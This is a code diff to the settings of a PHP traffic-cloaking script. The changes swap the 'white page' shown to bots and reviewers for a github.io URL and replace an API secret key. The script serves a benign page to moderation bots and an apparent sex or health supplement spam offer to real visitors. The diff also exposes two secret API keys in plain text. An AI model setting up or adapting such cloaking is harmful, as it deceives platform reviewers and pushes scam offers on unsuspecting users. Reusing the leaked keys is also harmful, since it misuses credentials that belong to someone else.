@@ -1,6 +1,6 @@
 <?php
 /* Required settings     */
-$CLOAKING['WHITE_PAGE'] = 'http://mbc-arab.com/italypin/index.html';//PHP/HTML file or URL used for bots
+$CLOAKING['WHITE_PAGE'] = 'https://midos1.github.io/test/index.html';//PHP/HTML file or URL used for bots
 $CLOAKING['OFFER_PAGE'] = 'http://health2all.info/eretron/sexoblog-it/?sId=44563';//PHP/HTML file or URL offer used for real users
 $CLOAKING['DEBUG_MODE'] = 'on';// replace "on" with "off" to switch from debug to production mode
 /*********************************************/
@@ -66,7 +66,7 @@ $CLOAKING['PARANOID'] = false;
 /*********************************************/
 /* You API key.                              */
 /* DO NOT SHARE API KEY! KEEP IT SECRET!     */
-$CLOAKING['API_SECRET_KEY'] = 'v135379cb1f30947ce904037e19aba23a2';
+$CLOAKING['API_SECRET_KEY'] = 'v119d1668143084efe9eb06805488a4648';
 /*********************************************/
 // DO NOT EDIT ANYTHING BELOW !!!
 if(!empty($CLOAKING['VERSION']) || !empty($GLOBALS['CLOAKING']['VERSION'])) die('Recursion Error');
